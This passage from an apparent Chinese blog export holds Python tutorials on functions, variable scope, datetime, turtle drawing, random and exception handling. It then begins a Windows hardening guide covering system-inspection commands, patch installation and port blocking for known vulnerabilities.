class="Python">&gt;&gt;&gt;def func(a,b):    retrun a*b&gt;&gt;&gt;s = func(&quot;knock!&quot;,2)&gt;&gt;&gt;print(s)knock!knock!</code></pre><p>（2）函数可以没有return，此时函数并不返回值，如实例“生日歌”的happy()函数。函数也可以用return返回多个值，多个值以元祖类型保存，例如：</p><pre><code class="python">&gt;&gt;&gt; def func(a,b):    return b, a&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,type(s))(2, &#39;knock!&#39;) &lt;class &#39;tuple&#39;&gt;</code></pre><h3 id="函数对变量的作用"><a href="#函数对变量的作用" class="headerlink" title="函数对变量的作用"></a>函数对变量的作用</h3><p>（1）一个程序中的变量包括两类：全局变量和局部变量。全局变量指在函数之外定义的变量，一般没有缩进，在程序执行全过程有效。局部变量是指在函数内部使用的变量，仅在函数内部有效，当函数退出时变量将不存在。例如：</p><pre><code class="python">&gt;&gt;&gt; n = 1         #n是全局变量&gt;&gt;&gt; def func(a, b):    c = a * b     #c是局部变量，a和b作为函数参数也是局部变量    return c&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(c)Traceback (most recent call last):  File &quot;&lt;pyshell#14&gt;&quot;, line 1, in &lt;module&gt;    print(c)NameError: name &#39;c&#39; is not defined   #当函数执行完退出后，其内部变量将被释放&gt;&gt;&gt; def fun(a, b):    n = b         #这个n是在函数内部新生成的局部变量，不是全局变量    return a*b&gt;&gt;&gt; s = fun(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,n)    #测试一下n的值是否改变knock!knock! 1</code></pre><p>（2）函数fun()内部使用了变量n，并且将变量参数b赋值给变量n，但n的值并没有改变，因为函数fun()有自己的内存空间，它将n=b语句理解为生成一个局部变量n，并将参数b赋值给它，此时fun()函数没有将n当做全局变量。所以，函数退出后，局部变量n被释放，全局变量n的值没有改变。</p><p>（3）若希望让fun()函数将n当做全局变量，则需要在变量n使用前显式声明该变量为全局变量，代码如下：</p><pre><code class="python">&gt;&gt;&gt; n = 1&gt;&gt;&gt; def fun(a, b):    global n      #引入全局变量    n = b         #将局部变量b赋值给全局变量n    return a*b&gt;&gt;&gt; s = fun(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,n)    #测试一下n的值是否改变knock!knock! 2</code></pre><p>（4）当全局变量不是整数n，而是列表类型ls时，全局列表变量会在函数的调用后发生改变。代码如下：</p><pre><code class="python">&gt;&gt;&gt; ls = []       #ls是全局列表变量&gt;&gt;&gt; def func(a,b):    ls.append(b)  #将局部变量b增加到全局列表变量ls中    return a*b&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,ls)knock!knock! [2]</code></pre><p>（5）列表等组合数据类型由于操作多个数据，所以他们在使用中有创建和引用的分别。当列表变量被方括号([]，无论是否为空)赋值时，这个列表才被真实创建，否则只是对之前创建列表的一次引用。</p><p>（6）上述代码func()函数的ls.append(b)语句执行时需要一个真实创建过的列表，此时func()函数专属的内存空间中没有已经创建过且名称为ls的列表，因此，func()函数进一步去寻找全局内存空间，自动关联全局ls列表，并修改其内容。当func()函数退出后，全局ls列表中的内容被修改。也就是说，<strong>对于列表类型，函数可以直接使用全局列表而不需要采用global进行声明。</strong></p><p>（7）若func()函数内部存在一个真实创建过且名称为ls的列表，则func()函数将操作该列表而不会修改全局变量。例如：</p><pre><code class="python">&gt;&gt;&gt; ls = []        #ls是全局列表变量&gt;&gt;&gt; def func(a,b):    ls = []        #创建了名称为ls的局部列表变量列    ls.append(b)   #将局部变量b增加到局部列表变量ls中    return a*b&gt;&gt;&gt; s = func(&quot;knock!&quot;,2)&gt;&gt;&gt; print(s,ls)    #测试ls的值是否被改变knock!knock! []</code></pre><p><strong>总结，Python函数对变量的作用遵守如下原则。</strong></p><ul><li>简单数据类型变量无论是否与全局变量重名，仅在函数内部创建和使用，函数退出后变量被释放，如有全局同名变量，其值不变。</li><li>简单数据类型变量在用global保留字声明后，作为全局变量使用，函数退出后该变量保留且值被函数改变。</li><li>对于组合数据类型的全局变量，如果在函数内部没有被真实创建的同名变量，则函数内部可以直接使用并修改全局变量的值。</li><li>如果函数内部真实创建了组合数据类型变量，无论是否有同名全局变量，函数仅对局部变量进行操作，函数退出后局部变量被释放，全局变量值不变。</li></ul><p><strong>扩展：指针和引用</strong></p><p>（1）指针是保存地址的变量，一般出现在比较底层的程序设计语言中，如C语言。引用是某一变量的别名，用这个名字可以对变量进行操作，如Python列表类型的引用。</p><p>（2）二者的主要区别是，指针直接指向内存地址，说明对象已经生成，而引用只是别名，需要真实创建对象才能操作对象。</p><h2 id="datetime库的使用"><a href="#datetime库的使用" class="headerlink" title="datetime库的使用"></a>datetime库的使用</h2><p>要点：<strong>Python时间处理的标准函数库datetime提供了一批显示日期和时间的格式化方法。</strong></p><h3 id="datetime库概述"><a href="#datetime库概述" class="headerlink" title="datetime库概述"></a>datetime库概述</h3><p>（1）datetime库可以从系统中获得时间，并以用户选择的格式输出。datetime库以格林威治时间为基础，每天由3600*24秒精确定义。该库包括两个常量：datetime.MINYEAR和datetime.MAXYEAR，分别表示datetime所能表示的最小、最大年份，值分别为1与9999.</p><p>（2）datetime库以类的方式提供多种日期和时间表达方式。</p><ul><li>datetime.date：日期表示类，可以表示年、月、日等。</li><li>datetime.time：时间表示类，可以表示小时、分钟、秒、毫秒等。</li><li>datetime.datetime：日期和时间表示的类，功能覆盖date和time类。</li><li>datetime.timedelta：与时间间隔有关的类。</li><li>datetime.tzinfo：与时区有关的信息表示类。</li></ul><p>（3）以上表达方式中，datetime.datetime类表达形式最为丰富。使用datetime类需要用import保留字，引用datetime类的方式如下：</p><pre><code class="python">from datetime import datetime</code></pre><h3 id="datetime库解析"><a href="#datetime库解析" class="headerlink" title="datetime库解析"></a>datetime库解析</h3><p>（1）datetime类(datetime.datetime类)的使用方式是首先创建一个datetime对象，然后通过对象的方法和属性显示时间。创建datetime对象有三种方法：datetime.now()、datetime.utcnow()和datetime.datetime()。</p><ul><li><p>使用datetime.now()获得当前日期和时间对象，使用方法如下：</p><p><strong>datetime.now()</strong></p><p>作用：返回一个datetime类型，表示当前的日期和时间，精确到微秒。</p><p>参数：无</p><p>调用该函数，执行结果如下：</p><pre><code class="python">&gt;&gt;&gt;from datetime import datetime&gt;&gt;&gt;today = datetime.now()&gt;&gt;&gt;todaydatetime.datetime(2021, 2, 10, 17, 34, 27, 70232)</code></pre></li><li><p>使用datetime.utcnow()获得当前日期和时间对应的UTC(世界标准时间)时间对象，使用方法如下：</p><p><strong>datetime.utcnow()</strong></p><p>作用：返回一个datetime类型，表示当前日期和时间的UTC表示，精确到微秒。</p><p>参数：无</p><p>调用该函数，执行结果如下：</p><pre><code class="python">&gt;&gt;&gt; today = datetime.utcnow()&gt;&gt;&gt; todaydatetime.datetime(2021, 2, 10, 9, 36, 43, 119372)</code></pre></li><li><p>datetime.now()和datetime.utcnow()都返回一个datetime类型的对象，也可以直接使用datetime()构造一个日期和时间对象，使用方法如下：</p><p><strong>datetime(year, month, day, hour=0, minute=0, second=0, microsecond=0)</strong></p><p>作用：返回一个datetime类型，表示指定的日期和时间，可以精确到微秒。</p><p>参数如下：</p><p>year：指定的年份，MINYEAR &lt;= year &lt;= MAXYEAR</p><p>month：指定的月份，1 &lt;= month &lt;= 12</p><p>day：指定的日期，1 &lt;= day &lt;= 月份所对应的日期上限</p><p>hour：指定的小时，0 &lt;= hour &lt; 24</p><p>minute：指定的分钟数，0 &lt;= minute &lt; 60</p><p>second：指定的秒数，0 &lt;= second &lt; 60</p><p>microsecond：指定的微秒数，0 &lt;= microsecond &lt; 1000000</p><p>其中，hour、minute、second、microsecond参数可以全部或部分省略</p><p>调用datetime()函数直接创建一个datetime对象，表示2021年2月10日17:47,32秒7微秒，执行结果如下：</p><pre><code class="python">&gt;&gt;&gt; someday = datetime(2021,2,10,17,47,32,7)&gt;&gt;&gt; somedaydatetime.datetime(2021, 2, 10, 17, 47, 32, 7)</code></pre><p>（2）当程序有了一个datetime对象，就可以进一步利用这个对象的属性显示时间，为了区别datetime库名，采用上例中的someday代替生成的datetime对象。常见属性如下表所示。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">someday.min</td><td align="center">固定返回datetime的最小时间对象，datetime(1,1,1,0,0)</td></tr><tr><td align="center">someday.max</td><td align="center">固定返回datetime的最大时间对象，datetime(9999,12,31,23,59,59,999999)</td></tr><tr><td align="center">someday.year</td><td align="center">返回someday包含的年份</td></tr><tr><td align="center">someday.month</td><td align="center">返回someday包含的月份</td></tr><tr><td align="center">someday.day</td><td align="center">返回someday包含的日期</td></tr><tr><td align="center">someday.hour</td><td align="center">返回someday包含的小时</td></tr><tr><td align="center">someday.minute</td><td align="center">返回someday包含的分钟</td></tr><tr><td align="center">someday.second</td><td align="center">返回someday包含的秒钟</td></tr><tr><td align="center">someday.microsecond</td><td align="center">返回someday包含的微妙值</td></tr></tbody></table><p>（3）datetime对象有3个常用的时间格式化方法，如下表所示。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">someday.isoformat()</td><td align="center">采用ISO 8601标准显示时间</td></tr><tr><td align="center">someday.isoweekday()</td><td align="center">根据日期计算星期后返回1到7，对应星期一到星期日</td></tr><tr><td align="center">someday.strftime()</td><td align="center">根据格式化字符串format进行格式显示的方法</td></tr></tbody></table><ul><li>isoformat() 和isoweekday() 方法的使用如下：</li></ul><pre><code class="python">&gt;&gt;&gt; someday = datetime(2021,2,10,17,47,32,7)&gt;&gt;&gt; someday.isoformat()&#39;2021-02-10T17:47:32.000007&#39;&gt;&gt;&gt; someday.isoweekday()3</code></pre></li><li><p>strftime()方法是时间格式化最有效的方法，几乎可以以任何通用格式输出时间。例如：</p><pre><code class="python">&gt;&gt;&gt; someday.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)&#39;2021-02-10 17:47:32&#39;</code></pre></li><li><p>下表给出了strftime()方法的格式化控制符。</p></li></ul><table><thead><tr><th align="center">格式化字符串</th><th align="center">日期/时间</th><th align="center">值范围和实例</th></tr></thead><tbody><tr><td align="center">%Y</td><td align="center">年份</td><td align="center">0001~9999，例如：1900</td></tr><tr><td align="center">%m</td><td align="center">月份</td><td align="center">01~12，例如：10</td></tr><tr><td align="center">%B</td><td align="center">月名</td><td align="center">January~December，例如：April</td></tr><tr><td align="center">%b</td><td align="center">月名缩写</td><td align="center">Jan~Dec，例如：Apr</td></tr><tr><td align="center">%d</td><td align="center">日期</td><td align="center">01~31，例如：25</td></tr><tr><td align="center">%A</td><td align="center">星期</td><td align="center">Monday~Sunday，例如：Wednesday</td></tr><tr><td align="center">%a</td><td align="center">星期缩写</td><td align="center">Mon~Sun，例如：Wed</td></tr><tr><td align="center">%H</td><td align="center">小时(24h制)</td><td align="center">00~23，例如：12</td></tr><tr><td align="center">%I</td><td align="center">小时(12h制)</td><td align="center">12<del>12/1</del>12，例如：06</td></tr><tr><td align="center">%M</td><td align="center">分钟</td><td align="center">00~59，例如：26</td></tr><tr><td align="center">%S</td><td align="center">秒钟</td><td align="center">00~59，例如：26</td></tr><tr><td align="center">%x</td><td align="center">日期</td><td align="center">月/日/年，例如：02/10/2021</td></tr><tr><td align="center">%X</td><td align="center">时间</td><td align="center">时:分:秒，例如：18:22:08</td></tr><tr><td align="center">%p</td><td align="center">上午和下午两个时段</td><td align="center">AM/PM</td></tr></tbody></table><ul><li><p>strftime()格式化字符串的数字左侧会自动补零，上述格式也可以与print()的格式化函数一起使用，例如：</p><pre><code class="python">&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; now =datetime.now()&gt;&gt;&gt; now.strftime(&quot;%Y-%m-%d&quot;)&#39;2021-02-10&#39;&gt;&gt;&gt; now.strftime(&quot;%A, %d. %B %Y %I:%M%p&quot;)&#39;Wednesday, 10. February 2021 06:24PM&#39;&gt;&gt;&gt; print(&quot;今天是&#123;0:%Y&#125;年&#123;0:%m&#125;月&#123;0:%d&#125;日&quot;.format(now))今天是2021年02月10日</code></pre></li></ul><h2 id="实例：七段数码管绘制"><a href="#实例：七段数码管绘制" class="headerlink" title="实例：七段数码管绘制"></a>实例：七段数码管绘制</h2><p><strong>用于理解函数及其封装的价值</strong></p><p>（1）七段数码管由7段数码管拼接而成，每段有亮或不亮两种情况，改进型的七段数码管还包括一个小数点的位置。七段数码管能形成pow(2,7)=128种不同状态，其中部分状态能够显示易于人们理解的数字或字母含义，因此被广泛使用。</p><p>（2）通过turtle库函数绘制七段数码管形式的日期信息。该问题的IPO描述如下：</p><ul><li>输入：当前日期的数字形式</li><li>处理：根据每个数字绘制七段数码管表示</li><li>输出：绘制当前日期的七段数码管表示</li></ul><p>（3）每个0到9的数字都有相同的七段数码管样式，因此可以通过设计函数复用数字的绘制过程。此外，每个七段数码管包括7个数码管样式，除了数码位置不同外，绘制风格一致，也可以通过函数复用单个数码端的绘制过程。程序的全部代码如下：</p><pre><code class="python">import turtle, datetimedef drawLine(draw):         #绘制单段数码管    turtle.pendown() if draw else turtle.penup()    turtle.fd(40)    turtle.right(90)        #画笔指针顺时针旋转90度def drawDigit(d):           #根据数字绘制七段数码管    drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,1,3,4,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,6,8] else drawLine(False)    turtle.left(90)         #画笔指针逆时针旋转90度    drawLine(True) if d in [0,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,1,2,3,4,7,8,9] else drawLine(False)    turtle.left(180)    turtle.penup()    turtle.fd(20)def drawDate(date):          #获得要输出的数字    for i in date:        drawDigit(eval(i))   #通过eval()函数将数字变为整数def main():    turtle.setup(800,350,200,200) #设置窗口大小    turtle.penup()    turtle.fd(-300)               #后退300    turtle.pensize(5)             #设置画笔宽度    drawDate(datetime.datetime.now().strftime(&#39;%Y%m%d&#39;))  #设置格式化后的系统时间    turtle.hideturtle()     #隐藏乌龟main()</code></pre><p><img src="https://i.loli.net/2021/02/10/YcpEnA9ae7mkbdM.png" alt="image-20210210185913020"></p><p>（4）实例代码中定义了drawDigit()函数，该函数根据输入的数字d绘制七段数码管。每个数码管的绘制顺序如下图所示。</p><p><img src="https://i.loli.net/2021/02/10/3sCFkVX5Uv6dIEo.png" alt="image-20210210190032681"></p><p>（5）绘制起点在数码管中部左侧，无论每段数码管是否会被绘制出来，turtle画笔都会按顺序画完7个数码管。对于给定的数字d，那个数码段会被绘制出来采用if-else语句判断。</p><pre><code class="python">drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)</code></pre><p>（6）上面一行代码根据输入数字判断是否要绘制七段数码管最中间的横线，当需要绘制时，调用绘制函数drawLine()，参数赋值True；当不需要绘制时，参数赋值False。根据0~9数字结构，对于2,3,4,5,6,8,9这些数字需要绘制，否则不需要绘制。</p><p>（7）为了使输出样式固定，简化设计，当不需要绘制时，turtle画笔需要抬起。drawLine()函数根据输出参数的值(True或False)决定是否抬起画笔。</p><p>（8）为了使代码模块化更好，实例中定义了drawDate()函数和main()函数。</p><ul><li>其中drawDate()函数将更长数字分解为单个数字，进一步调用drawDigit()分别绘制每个数字。</li><li>main()函数将启动窗体大小、设置画笔宽度、设置系统时间等功能封装在一起，但main()函数并不体现单一功能，这种封装仅从提高代码可读性角度考虑。</li></ul><p>（9）2.0版本</p><pre><code class="python">import turtle, datetimedef drawGap():              #绘制数码管间隔    turtle.penup()    turtle.fd(5)def drawLine(draw):         #绘制单段数码管    drawGap()    turtle.pendown() if draw else turtle.penup()    turtle.fd(40)    drawGap()    turtle.right(90)def drawDigit(d):           #根据数字绘制七段数码管    drawLine(True) if d in [2,3,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,1,3,4,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,6,8] else drawLine(False)    turtle.left(90)    drawLine(True) if d in [0,4,5,6,8,9] else drawLine(False)    drawLine(True) if d in [0,2,3,5,6,7,8,9] else drawLine(False)    drawLine(True) if d in [0,1,2,3,4,7,8,9] else drawLine(False)    turtle.left(180)    turtle.penup()    turtle.fd(20)def drawDate(date):          #获得要输出的数字    turtle.pencolor(&quot;red&quot;)    for i in date:        if i == &#39;-&#39;:            turtle.write(&#39;年&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))            turtle.pencolor(&quot;green&quot;)            turtle.fd(40)        elif i == &#39;=&#39;:            turtle.write(&#39;月&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))            turtle.pencolor(&quot;blue&quot;)            turtle.fd(40)        elif i == &#39;+&#39;:            turtle.write(&#39;日&#39;,font=(&quot;Arial&quot;,18,&quot;normal&quot;))        else:            drawDigit(eval(i))def main():    turtle.setup(800,350,200,200)    turtle.penup()    turtle.fd(-350)    turtle.pensize(5)    drawDate(datetime.datetime.now().strftime(&#39;%Y%m%d&#39;))    turtle.hideturtle()main()</code></pre><p><img src="https://i.loli.net/2021/02/10/WA3NPQFU1VbdJ5H.png" alt="image-20210210195715369"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(四)-程序的控制结构02</title>
      <link href="2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/"/>
      <url>2020/12/13/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8402/</url>
      
        <content type="html"><![CDATA[<h2 id="random库的使用"><a href="#random库的使用" class="headerlink" title="random库的使用"></a>random库的使用</h2><p><strong>要点：随机运算的标准函数库random共提供9个常用函数</strong></p><h3 id="random库描述"><a href="#random库描述" class="headerlink" title="random库描述"></a>random库描述</h3><p>Python内置的random库主要用于产生各种分布的伪随机数序列。random采用梅森旋转算法生成伪随机数序列。主要目的是生成随机数，所有函数都是基于最基本的random.random()函数扩展实现。</p><h3 id="random库解析"><a href="#random库解析" class="headerlink" title="random库解析"></a>random库解析</h3><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">seed(a=None)</td><td align="center">初始化随机数种子，默认值为当前系统时间</td></tr><tr><td align="center">random()</td><td align="center">生成一个[0.0, 1.0]之间的随机小数</td></tr><tr><td align="center">randint(a, b)</td><td align="center">生成一个[a,  b]之间的整数</td></tr><tr><td align="center">getrandbits(k)</td><td align="center">生成一个k比特长度的随机整数</td></tr><tr><td align="center">randrange(start, stop[, step])</td><td align="center">生成一个[start, stop]之间以step为步数的随机整数</td></tr><tr><td align="center">uniform(a, b)</td><td align="center">生成一个[a, b]之间的随机小数</td></tr><tr><td align="center">choice(seq)</td><td align="center">从序列类型，例如列表中随机返回一个元素</td></tr><tr><td align="center">shuffle(seq)</td><td align="center">将序列类型中的元素随机排列，返回打乱后的序列</td></tr><tr><td align="center">sample(pop, k)</td><td align="center">从pop类型中随机选取k个元素，以列表类型返回</td></tr></tbody></table><p>（1）random库的引用方法与math库一样，可以采用下面两种方式实现：</p><p>import random 或 from random import *</p><pre><code class="python">&gt;&gt;&gt; from random import *&gt;&gt;&gt; randrange(0, 100, 4)  #从0开始到100以4递增的元素中随机返回20&gt;&gt;&gt; choice(range(100))82&gt;&gt;&gt; list(range(10))[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; ls = list(range(10))&gt;&gt;&gt; shuffle(ls)&gt;&gt;&gt; print(ls)[3, 5, 8, 7, 9, 0, 1, 2, 6, 4]</code></pre><p>（2）生成随机数之前可以通过seed()函数指定随机数种子，随机数种子一般是一个整数，只要种子相同，每次生成的随机数序列也相同。</p><pre><code class="Python">seed(125)  #随机数种子赋值为125&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))&#39;4.4.10&#39;&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))&#39;5.10.3&#39;&gt;&gt;&gt; seed(125)   #再次给随机数种子赋值125&gt;&gt;&gt; print(&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;.format(randint(1, 10),randint(1, 10),randint(1, 10)))&#39;4.4.10&#39;</code></pre><p>（3）从上述语句可发现，在设定相同种子后，每次调用随机函数生成的随机数是相同的。这是随机数种子的作用。</p><h2 id="程序的异常处理"><a href="#程序的异常处理" class="headerlink" title="程序的异常处理"></a>程序的异常处理</h2><p><strong>要点：Python通过try、except等保留字提供异常处理功能</strong></p><pre><code class="python">num = eval(input(&quot;请输入一个数字：&quot;))print(num**2)</code></pre><p>（1）输入数字时，程序正常执行，若输入数字则会报错。</p><pre><code class="python">请输入一个数字：10010000&gt;&gt;&gt; 请输入一个数字：abcTraceback (most recent call last):  File &quot;&lt;pyshell#2&gt;&quot;, line 1, in &lt;module&gt;      #line1为异常发生的代码行数    num = eval(input(&quot;请输入一个数字：&quot;))  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#39;abc&#39; is not defined           #NameError为异常类型，后面跟异常内容提示&gt;&gt;&gt; </code></pre><h3 id="异常处理：try-except语句"><a href="#异常处理：try-except语句" class="headerlink" title="异常处理：try-except语句"></a>异常处理：try-except语句</h3><p>（1）Python使用try-except语句实现异常处理，其基本语法格式如下：</p><pre><code class="python">try:    &lt;语句块1&gt;except &lt;异常类型&gt;:    &lt;语句块2&gt;</code></pre><p>语句块1是正常执行的内容，当发生异常时执行except保留字后面的语句块。例如：</p><pre><code class="python">try:    num = eval(input(&quot;请输入一个数字：&quot;))    print(num**2)except NameError:    print(&quot;输入错误，请输入一个整数。&quot;)</code></pre><p>执行结果：</p><pre><code class="python">请输入一个数字：abc输入错误，请输入一个整数。&gt;&gt;&gt; </code></pre><h3 id="异常的高级用法"><a href="#异常的高级用法" class="headerlink" title="异常的高级用法"></a>异常的高级用法</h3><p>（1)try-except语句可以支持多个except语句，语法格式如下：</p><pre><code class="python">try:    &lt;语句块1&gt;except &lt;异常类型1&gt;:    &lt;语句块2&gt;...except &lt;异常类型N&gt;:    &lt;语句块N+1&gt;except:    &lt;语句块N+2&gt;</code></pre><p>（2）其中，第1到第N个except语句后面都指定了异常类型，说明这些except所包含的语句块只处理这些类型的异常。最后一个except语句没有指定任何类型，表示它对应的语句块可以处理所有其他异常。这个过程与if-elif-else语句类似，是分支结构的一种表达方式。例如：</p><pre><code class="python">try:    alp = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    idx = eval(input(&quot;请输入一个整数：&quot;))    print(alp[idx])except NameError:    print(&quot;输入错误，请输入一个整数!&quot;)except:    print(&quot;其他错误&quot;)</code></pre><p>（3）上面的程序中，当用户输入非整数字符时，except NameError 异常被捕获到，提示用户输入类型错误，当用户输入数字不再0到25之间时，异常被except捕获，程序打印其错误。执行结果如下：</p><pre><code class="python">&gt;&gt;&gt;请输入一个整数：abc输入错误，请输入一个整数!&gt;&gt;&gt;请输入一个整数：100其他错误</code></pre><p>（4）除了try和except保留字外，异常语句还可以和else和finally保留字配合使用，语法格式如下：</p><pre><code class="python">try:    &lt;语句块1&gt;except &lt;异常类型1&gt;:    &lt;语句块2&gt;else:    &lt;语句块3&gt;finally:    &lt;语句块4&gt;</code></pre><p>（5）else语句与循环中的else一样，当try中的语句块1正常执行结束且没有发生异常时，else中的语句块3执行，可以看作是对try语句块正常执行后的一种追加处理。若except捕获到异常，则不会执行else中的语句块3。</p><p>finally语句块则不同，无论try中的语句块1是否发生异常，语句块4都会执行。因此，可以将程序执行语句块1的一些收尾工作放在这里，例如：关闭、打开文件等。</p><pre><code class="python">try:    alp = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    idx = eval(input(&quot;请输入一个整数：&quot;))    print(alp[idx])except NameError:    print(&quot;输入错误，请输入一个整数!&quot;)except:    print(&quot;其他错误&quot;)else:    print(&quot;没有发生异常&quot;)finally:    print(&quot;程序执行完毕，不知道是否发生了异常&quot;)</code></pre><p>执行结果：</p><pre><code class="python">&gt;&gt;&gt;请输入一个整数：6G没有发生异常程序执行完毕，不知道是否发生了异常&gt;&gt;&gt; 请输入一个整数：abc输入错误，请输入一个整数!程序执行完毕，不知道是否发生了异常</code></pre><p>（6）try-except异常一般只用来检测极少发生的情况，编写程序时不应过度依赖try-except这种异常处理机制，应该尽量在程序中采用if语句直接判断，避免通过异常处理来应对可能发生的情况。因为采用try-except语句会影响代码的可读性，增加代码维护难度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统安全加固</title>
      <link href="2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
      <url>2020/12/10/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="安全加固基本思路"><a href="#安全加固基本思路" class="headerlink" title="安全加固基本思路"></a>安全加固基本思路</h2><h3 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h3><p>（1）安全基线，即系统必须达到的最低的安全标准</p><p>（2）一般通过检查各安全配置参数是否符合标准来度量</p><h3 id="系统信息审查"><a href="#系统信息审查" class="headerlink" title="系统信息审查"></a>系统信息审查</h3><p>（1）查看系统的详细版本号，使用命令：</p><pre><code>ver 或者 winver</code></pre><p><img src="https://i.loli.net/2020/12/10/FMeLBRwpbI5d6WK.png" alt="image-20201210163842045"></p><p><img src="https://i.loli.net/2020/12/10/dnkx2zrlBDy5Obp.png" alt="image-20201210164309222"></p><p>（2）查看系统的服务补丁包(Service Pack)，1个SP版本包含了该系统一段时间系统补丁和服务更新的集合。</p><pre><code>wmic os get ServicePackMajorVersion</code></pre><p><img src="https://i.loli.net/2020/12/10/RMjFdkwe2aWpHsL.png" alt="image-20201210164333299"></p><p>（3）查看系统的补丁安装情况</p><pre><code>wmic qfe get hotfixid,InstalledOn</code></pre><p><img src="https://i.loli.net/2020/12/10/uaWThg9wYXoiRlc.png" alt="image-20201210164603798"></p><p>（4）查看主机名</p><pre><code>hostname</code></pre><p><img src="https://i.loli.net/2020/12/10/XAxzg9RNInQ86pi.png" alt="image-20201210164905930"></p><p>（5）查看系统信息，包括主机信息，注册ID，处理器，内存，BIOS，域，补丁，网卡等信息。</p><pre><code>systeminfo</code></pre><p><img src="https://i.loli.net/2020/12/10/5gmDzh12qQBv8tI.png" alt="image-20201210165140544"></p><p>（6）查看开放端口</p><pre><code>netstat -anonetstat -ano | find &quot;445&quot;     //端口筛选</code></pre><p><img src="https://i.loli.net/2020/12/10/ocea9lZtJTN5hIE.png" alt="image-20201210165941323"></p><p><img src="https://i.loli.net/2020/12/10/F4EUNLO9hQyi7fj.png" alt="image-20201210170028656"></p><p>（7）查看路由表，查看网络配置</p><pre><code>route printipconfig/all</code></pre><p><img src="https://i.loli.net/2020/12/10/HKiMeIPbUjcOXA2.png" alt="image-20201210170259177"></p><p><img src="https://i.loli.net/2020/12/10/ix2Xm8wFtZouLjv.png" alt="image-20201210170356121"></p><h2 id="Windows系统安全漏洞的修复"><a href="#Windows系统安全漏洞的修复" class="headerlink" title="Windows系统安全漏洞的修复"></a>Windows系统安全漏洞的修复</h2><h3 id="漏洞修复——方法1-补丁安装"><a href="#漏洞修复——方法1-补丁安装" class="headerlink" title="漏洞修复——方法1.补丁安装"></a>漏洞修复——方法1.补丁安装</h3><p>（1)补丁安装属于永久解决方案</p><p>（2）微软官方补丁管理，官网补丁下载地址:<a href="http://www.catalog.update.microsoft.com/home.aspx">http://www.catalog.update.microsoft.com/home.aspx</a></p><p><img src="https://i.loli.net/2020/12/10/Wd5ceJPw6niLkza.png" alt="image-20201210171059715"></p><p><img src="https://i.loli.net/2020/12/10/IoaNf5WcJEZ4Gyd.png" alt="image-20201210171120240"></p><h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><p><strong>以Windows7 SP1安装ms12-020漏洞补丁KB2621440为例</strong></p><p>（1）微软安全公告</p><p>（2）下载并安装补丁</p><p>（3）查看补丁安装情况</p><pre><code>wmic qfe get hotfixid,InstalledOn | find /i &quot;KB2621440&quot;</code></pre><p>（4）Metasploit验证无漏洞</p><h3 id="漏洞修复——方法2-端口封禁"><a href="#漏洞修复——方法2-端口封禁" class="headerlink" title="漏洞修复——方法2.端口封禁"></a>漏洞修复——方法2.端口封禁</h3><p>（1）端口封禁是漏洞修复的临时解决方法</p><p>（2）端口能被利用，是因为漏洞所在服务依赖端口开放访问，如果将端口封禁，那么漏洞便无法成功利用。封禁并不是把端口关掉，而是把访问该端口的流量过滤。例：</p><p>ms17-010漏洞所在服务是文件共享服务smb，依赖端口为135,139,445</p><p>ms12-020漏洞所在服务是远程桌面服务RDP，依赖端口为3389</p><p>ms15-034漏洞所在服务是超文本传输协议http，依赖端口为80</p><p>（3）端口封禁的方法：在组策略中创建IP安全策略。</p><h4 